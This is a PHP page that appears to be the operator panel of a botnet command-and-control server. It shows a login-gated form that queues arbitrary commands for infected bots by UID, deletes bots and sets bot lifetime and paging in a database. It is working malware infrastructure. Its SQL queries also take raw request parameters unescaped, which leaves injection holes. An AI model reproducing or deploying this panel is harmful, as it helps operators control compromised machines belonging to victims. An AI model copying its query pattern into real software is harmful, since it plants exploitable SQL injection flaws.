
<html>
<body bgcolor="#C8C8C8">
<center>
<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="get"> <!-- We are posting in same page so it can get reloaded when we change the settings -->
<b>Command:</b> <input type="text" name="command" size="40" />
<b>Value:</b> <input type="text" name="Value" size="40" />
</br>
<input type="submit" name="submit" value="SET!" />

</form>
</body>
<?php

session_start();
if(!isset($_SESSION['loggedin']))
{
die();
}

//includes
include ("config.php");


if(!empty($_GET["del"])) {
$UID = $_GET["del"];
$del = "DELETE FROM `" . $dbname . "`.`bots` WHERE `UID` LIKE '$UID'";
mysql_query($del);
}

//////////////////////////
//Command insert handling
if(!empty($_GET["command"])) {

if(!empty($_GET["Value"])) { $Value = trim($_GET["Value"],' '); } else { $Value = ""; }

if($_GET["command"]=="set-botlife") { //SET BOT LIFE IN MINUTES

$query = "UPDATE `" . $dbname . "`.`config`SET`Cnf_ValueInt`='$Value' WHERE`config`.`Cnf_Name`='BotLife' ";
mysql_query($query);

} else if($_GET["command"]=="set-botsperpage") { //SET AMOUNT OF BOT'S ROWS PER PAGE

$query = "UPDATE `" . $dbname . "`.`config`SET `Cnf_ValueInt`='$Value' WHERE`config`.`Cnf_Name`='BotsPerPage' ";
mysql_query($query);

} else { //Insert command for bots

$Command = trim($_GET["command"]);
$InsertTime = time();
$insert = "INSERT INTO `" . $dbname . "`.`commands` (`UID`, `Command`, `InsertTime`) VALUES ('$Value', '$Command', '$InsertTime')";
mysql_query($insert); 

} 
} //Inserting command

include ("pagination.php"); //Include is here so the pagination.php can be refreshed after subimiting command to change the statistics

//////////////////////////////////
 
?>